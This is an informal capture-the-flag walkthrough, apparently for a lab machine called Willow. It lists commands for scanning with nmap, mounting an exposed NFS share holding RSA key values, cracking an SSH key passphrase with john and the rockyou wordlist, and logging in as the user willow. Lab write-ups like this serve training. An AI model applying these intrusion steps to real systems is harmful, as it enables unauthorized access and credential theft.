

```export IP=10.10.138.174```

```nmap -sV -sC $IP```

from port 2049, we get this

```──╼ $mkdir nfs

└──╼ $sudo mount $IP:/var/failsafe nfs/

└──╼ $ls -la
total 8
drwxr--r-- 2 nobody nogroup 4096 Jan 30  2020 .
drwxr-xr-x 1 srini  srini     92 May 14 20:55 ..
-rw-r--r-- 1 root   root      62 Jan 30  2020 rsa_keys

└──╼ $cat rsa_keys 
Public Key Pair: (23, 37627)
Private Key Pair: (61527, 37627)
```

so we go the public and private key pair, now we got to decrypt that fkin private key, lets do it

```wget http://$IP:80/ -O rsahex``` or get the content from the site on port 80 and paste it in your rsahex

conerting that hex top ascii gives us some encrypted stuff

our little exp.py gave us the idrsa but its still has a password

```$/usr/share/john/ssh2john.py idrsapasswd > idrsajohn```

this gav eus the passweorfd
```john --wordlist=/usr/share/wordlists/rockyou.txt idrsajohn```

and we got the username from index.html - willow

```ssh -i idrsapasswd willow@10.10.138.174```
```scp -i idrsapasswd willow@$IP:/home/willow/user.jpg .```

